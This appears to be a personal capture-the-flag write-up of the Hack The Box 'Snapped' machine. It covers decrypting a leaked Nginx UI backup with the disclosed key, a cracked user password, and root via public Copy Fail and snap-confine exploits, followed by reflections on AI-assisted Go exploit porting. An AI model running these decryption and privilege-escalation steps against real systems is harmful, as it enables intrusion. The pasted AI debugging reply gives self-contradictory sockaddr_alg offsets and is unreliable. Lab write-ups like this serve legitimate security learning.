# Snapped Helped-Through

Name: Snapped
Date:  
Difficulty:  Hard
Goals:  
- Rewrite the 0xdf deobfuscated exploit in python to Golang with AI help, but not straight copy and paste-ing try building piece by piece to understand the parts in both python and golang more deeply 
- Ease back into CTFs and habits
Learnt:
- Subdomains exist
- There is reason python is used in exploit dev
- Pipes are more finickty with lower level language 
- Versions and CVE dorking 
- I need to learn how to solve cryptography challenges with `openssl`
Beyond Root:

- [[Snapped-Notes.md]]
- [[Snapped-CMD-by-CMDs.md]]

The initial starting point was the Beyond Root, after watching [0xdf YouTube Copy Fail Explained CVE-2026-31431](https://www.youtube.com/watch?v=wQ914geKOcw). I have always wanted to write a linux kernel exploit. And because I am trying to push out my programming horizons like the zerodium-PoC I wanted to rewrite the 0xdf deobfuscated exploit in python to Golang. I going to wrestle with AI for help. Some stipulations not straight copy and paste. No no Any lessons learnt go into the Archive Useful Golang article. When I say wrestle I really do not like programming with AI most of the time. I lose my place, I get told off for standards that I did not know changed so I am then rewriting something that was acceptable and does work, which I would have test snippet by snippet. AI also gets the jist, but the weirdness that comes from the mismatched of normal not having 100% understanding of everything and the everything you need to actually do to make it successful creates weird programming rabbitholes. So trying building piece by piece in a linear way that represents some understanding of the exploit code in both python and golang, such that I can copy paste and generalise some one or couple liners into a cheatsheet for Archive is the goal.

[0xdf YouTube Copy Fail Explained CVE-2026-31431](https://www.youtube.com/watch?v=wQ914geKOcw) video description:
*Copy Fail is the latest Linux privesc CVE, and it's a relatively simply exploit that overwrites files in the in-memory cache. The exploit will abuse this by overwriting the cahce for a SetUID binary and then running it. In this video I'll walk though the author's POC, show my own deobfuscated POC, and show how the vulnerability works. To close, I'll run it on the HTB Snapped machine and show how to cleanup the exploit.*
 

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)
Then running nmap after full port scan with `-sT`:
![](tcpnmap.png)

Then to the main site
![](webroot.png)

There is not much from enumerating, Gobuster, Nuclei and Gospider. Peaked at writeup and remembered that vhost exist.
![](adminsubdomain.png)

`admin@example.com : changeme` did not work.
![](adminnginxui.png)
After flailing with Golang Exploit I read ahead for the write up: [0xdf](https://0xdf.gitlab.io/2026/04/01/htb-snapped.html). This was mostly to try out stuff that 0xdf does not do and what new techniques I can learn.


```bash
# Get an index-$id.js to enumerate the version, dont forget enumerate version.js too
curl $URL -s | grep -P '.js\b'
```

Similar to 0xdf I started directory bruteforcing the /api directory, which did not appear in raft-X when target the web root
![](backupintheapi.png)

Unzipping the backup download from BurpSuite blindly
![](hashinfo.png)

It came with this weird error message
![](unopenable.png)
Another weird error message
![](zipnolikey.png)
## Exploit

https://nvd.nist.gov/vuln/detail/CVE-2026-27944 states:
> *Nginx UI is a web user interface for the Nginx web server. Prior to version 2.3.3, the /api/backup endpoint is accessible without authentication and discloses the encryption keys required to decrypt the backup in the X-Backup-Security response header. This allows an unauthenticated attacker to download a full system backup containing sensitive data (user credentials, session tokens, SSL private keys, Nginx configurations) and decrypt it immediately. This issue has been patched in version 2.3.3.*

Walkthrough of how to exploit it: https://cvereports.com/reports/CVE-2026-27944
![](rootcause.png)

0xdf points out a critical rabbithole, because the response headers contain the decryption key, does the decryption key change as response headers would.
![](changinxbackupsecurity.png)
I decided to follow along with the CVE walkthrough as that is what would be more realistic. This is the key used to access the /api/backup, which is part of the vulnerability
```
X-Backup-Security: /AdLop1rj7XNKkIXbRggFZ3ekwVjEpL/LcWICC5vl6c=:VvvLz6kQE8Jbrp+/bHJuzQ==
```
Then ran into errors
![](errorincrack.png)

This is where I would have stumbled in the past especially without AI assistance when there was none. We need to convert it into base64 and gotcha is the padding is needed. Learning `openssl` to do stuff was always a desired headache so 

```bash

echo /AdLop1rj7XNKkIXbRggFZ3ekwVjEpL/LcWICC5vl6c= | base64 -d | xxd -p -c 0
fc074ba29d6b8fb5cd2a42176d1820159dde9305631292ff2dc588082e6f97a7

echo VvvLz6kQE8Jbrp+/bHJuzQ== | base64 -d | xxd -p -c 0

# Use xxd to format string to plain hexdump style with 0 octets
echo $Key | base64 -d | xxd -p -c 0
echo $IV | base64 -d | xxd -p -c 0
openssl enc -$algorithm -d -in $encrypted.$file -out $decrypted.$file -K $Key -iv $IV

# There are only two other cbc aes encryption standards
openssl enc -aes-256-cbc -d -in hash_info.txt -out hash_info_dec.txt -K fc074ba29d6b8fb5cd2a42176d1820159dde9305631292ff2dc588082e6f97a7  -iv 56fbcbcfa91013c25bae9fbf6c726ecd
# enc = encrypt or decrypt
openssl enc -aes-256-cbc -d -in nginx.zip -out nginx_dec.zip -K fc074ba29d6b8fb5cd2a42176d1820159dde9305631292ff2dc588082e6f97a7 -iv 56fbcbcfa91013c25bae9fbf6c726ecd

openssl enc -aes-256-cbc -d -in nginx-ui.zip -out nginx-ui_dec.zip -K fc074ba29d6b8fb5cd2a42176d1820159dde9305631292ff2dc588082e6f97a7 -iv 56fbcbcfa91013c25bae9fbf6c726ecd
```

![](unzippingthedecryptnui.png)
Using the Sqlite3 database 
```sql
sqlite3 database.db
.headers on
.users
select * from users;
```
![](passwords.png)

To save my time, because I stuck with Pwnbox and I have cracked loads of passwords before. 

`jonathan : linkinpark`
![](linkinpark.png)

## Privilege Escalation

I am very glad I watch the 0xdf exploit video for [copy-fail-CVE-2026-31431](https://github.com/0xdf223/copy-fail-CVE-2026-31431). In future exams I would not have considered snapd unless I had heard about it. In the future I want to setup my Gzhodan news reading helper to aid in recent exploits. And although my Golang version and learning about using AI in 2026 for programming had some interesting learning points and conclusions about how much AI and what are the main problems with AI and programming I will root the box with the simplest way first.

![](rootedcopyfailed.png)

Cleaning up exploit
```bash
# As root
echo 3 > /proc/sys/vm/drop_caches
```


As 0xdf explains the box is titled after CVE-2026-3888 snapd vulnerability and in the OSCP it would be a good check to check if at the end of enumerating local privilege escalation what recent vulnerabilities could be use.

[qualys bug report for CVE-2026-3888](https://blog.qualys.com/vulnerabilities-threat-research/2026/03/17/cve-2026-3888-important-snap-flaw-enables-local-privilege-escalation-to-root)
> 1. The attacker must wait for the system’s cleanup daemon (30 days in Ubuntu 24.04; 10 days in later versions) to delete a critical directory (/tmp/.snap) required by snap-confine.
> 2. Once deleted, the attacker recreates the directory with malicious payloads.
> 3. During the next sandbox initialization, snap-confine bind-mounts these files as root, allowing the execution of arbitrary code within the privileged context.

0xdf adds *"It’s a bit more complex than that. The `snap-confine` binary is SetUID root. When a user runs a snap (e.g. Firefox), it sets up a mount namespace. Part of that involves creating “mount mimics”, copying directory trees into `/tmp/.snap/` so it can create writable mountpoints in otherwise read-only paths. If `/tmp/.snap` doesn’t exist (such as when `systemd-tmpfiles` deleted it), `snap-confine` rebuilds it. If an attacker can create `/tmp/.snap` first with attacker-owned content, `snap-confine` (running as root) will bind-mount those files into the namespace. The trick used to exploit this is to replace `ld-linux-x86-64.so.2` (the dynamic linker) with a binary that takes some attacker desired action. When SetUID `snap-confine` loads it, it will run whatever the attacker put in that library as root. Searching for POCs for this exploit, there’s [one by TheCyberGeek](https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE), who happens to be a co-author on Snapped."*

From memory for OSCP it is generally a bad sign in OSCP if `gcc` is not on the machine that you are exploiting as you then have to match the stack on the box and compile for it. Not sure how accurate that information is anymore. 

```bash
# Exploit relies on the Systemd timer that is looking for files and directories in temp locations older than 30 days to clean up
systemctl list-timers systemd-tmpfiles-clean
# Check here for how long it will wait to update - default is for 30 days
cat /usr/lib/tmpfiles.d/tmp.conf
# Check if snap-confine is SetUID
ls -l /usr/lib/snapd/snap-confine

```
[GitHub TheCyberGeek CVE-2026-3888 PoC](https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE)
```bash
gcc -O2 -static -o exploit exploit_suid.c
gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c

# If transfer do not forget to chmod +x both
./exploit librootshell.so 
```

First attempt got to phase 5. Second finished
![](snapdroot.png)


## Post-Root-Reflection  

I got to read and try out looks of very unfamiliar Golang. I have also never worked with unix piping properly

- Check for subdomains; subdomains exist
- Tech Stack get HTTP Headers
- Dork the tech stack
- 
## Beyond Root

For the beyond root I wanted to try to translate the copyfail exploit [writeup](https://xint.io/blog/copy-fail-linux-distributions) from python to Golang to expose myself to Golang I had not really played with before. I learnt more about the differences between python and Golang and specifically the ease of some the alignment issues I faced in Golang were not present in python. I explored the Sliver Armory documentation and consulted Gemini to learn more about how implants and exploit dev works. This was after I tried piece-by-piece translating the exploit to greater understand how to write Golang exploits. My intuition being that to learn new golang I need to take it slow and methodical. After a lot of failure, I requested a straight translation of the entire exploit code. I also choose Gemini, because google and golang AI model correctness is more likely. Given my physic interest of the last 2 years I decided to check maybe I am coding inappropriately with AI. [ForrestKnight Everything You Need to Know About Coding with AI // NOT vibe coding](https://www.youtube.com/watch?v=5fhcklZe-qE) general takeaways:
- Use my UltraPrompts but for each module specific
- Be specific
- Do tasks like testable spirits in Agile
- Question decisions of AI
- Use multiple agents (not sure how successful the information overhead for programmer is for that)

Comparison with how I was using AI
- Prompting task by task and mostly to snippet level rather than using an Agent
- I trusted AI's preference of unix initially, but now questioning that even with the above suggestions this would be lost 
- Also the AI is programmed to explain and rationalise decisions and save compute by giving you those rationalisation than computing more complex code.

I think the main problem with the video's approach is the potential junk work that leads to nowhere is not automated. You have read everything and you are creating potential exponential curve of more meta-project work that reduces the time to actually solve the problem. I think I just need to be more microscope, line by line. Also do more prompt or researching around how pipes work and map them out. I also think that AI is a nightmare money sink for me as I won't know if I am actually improving, while I do not really learn because of the information overhead, while potentially heading into weird loops of not actually completing something. 

Infinite monkeys use an LLM to write software the LLM has to respond does the set of monkeys ever make the software? Below is the following directions from Claude:


## If I wanted to keep trying

Claude responded: 
Let's debug this systematically.
Let's debug this systematically. The `invalid argument` from `sendmsg` on AF_ALG usually means the kernel rejected the socket setup, not just the cmsg. Let me help identify the root cause:

User chose: SYS_SENDMSG fails

Good — so socket setup, key, authsize, and accept all succeed. The kernel is rejecting the message itself. Here are the likely remaining culprits:

---

1. `sa` sockaddr buffer is wrong size / layout

The `sockaddr_alg` struct is exactly **88 bytes**, but your field offsets may be off. The correct layout is:

```
[0:2]   salg_family  (uint16)
[2:14]  salg_type    (char[14])   ← "aead\x00" goes HERE, 14 bytes
[14:16] salg_feat    (uint16)
[16:18] salg_mask    (uint16)
[18:86] salg_name    (char[68])   ← name goes here
```

Your code uses `copy(sa[14:14+len(name)], name)` — but offset 14 is `salg_feat`, not `salg_name`. It should be offset **18**:

go

```go
sa := make([]byte, 88)
binary.LittleEndian.PutUint16(sa[0:2], uint16(syscall.AF_ALG))
copy(sa[2:16], []byte("aead"))       // salg_type[14]
// sa[14:16] = salg_feat (leave 0)
// sa[16:18] = salg_mask (leave 0)
copy(sa[18:], []byte("authencesn(hmac(sha256),cbc(aes))")) // salg_name[68]
```

---
2. Data layout sent to the AEAD cipher

For `authencesn(hmac(sha256),cbc(aes))` with `aadLen=8` and `authSize=4`, the data you send must be:

```
[AAD: 8 bytes][ciphertext][auth tag: 4 bytes]
```

But your code does:

go

```go
header := []byte("AAAA")         // 4 bytes AAD
data := append(header, fourBytes...) // + 4 bytes data
```

That's only **4 bytes of AAD** but `ALG_SET_AEAD_ASSOCLEN` is set to `aadLen = 8`. They must match exactly.

---

3. The splice approach won't work for this

`Splice` from a file into `opSocket` sends additional data **without** control messages — the kernel may interpret this as a second independent operation. The typical AF_ALG pattern for AEAD is:

go

```go
// Send everything in one sendmsg with the full payload
iov := syscall.Iovec{Base: &data[0], Len: uint64(len(data))}
msghdr := syscall.Msghdr{
    Iov:        &iov,
    Iovlen:     1,
    Control:    &cmsgs[0],
    Controllen: uint64(len(cmsgs)),
    Flags:      0,  // no MSG_MORE
}
```

All of `[AAD + ciphertext + authtag]` goes in the single `Iov`, no splice needed.

---
Minimal working pattern to test:

go

```go
aad := make([]byte, 8)           // 8 bytes AAD (matches aadLen=8)
ciphertext := fourBytes           // your actual ciphertext
authTag := make([]byte, authSize) // 4 byte auth tag (matches authSize=4)

data := append(aad, ciphertext...)
data  = append(data, authTag...)

iov := syscall.Iovec{Base: &data[0], Len: uint64(len(data))}
msghdr := syscall.Msghdr{
    Iov:        &iov,
    Iovlen:     1,
    Control:    &cmsgs[0],
    Controllen: uint64(len(cmsgs)),
    Flags:      0,
}
```

The `salg_name` offset being wrong (**18** not **14**) is the most likely cause of `invalid argument` from `sendmsg` even after the cmsg fixes.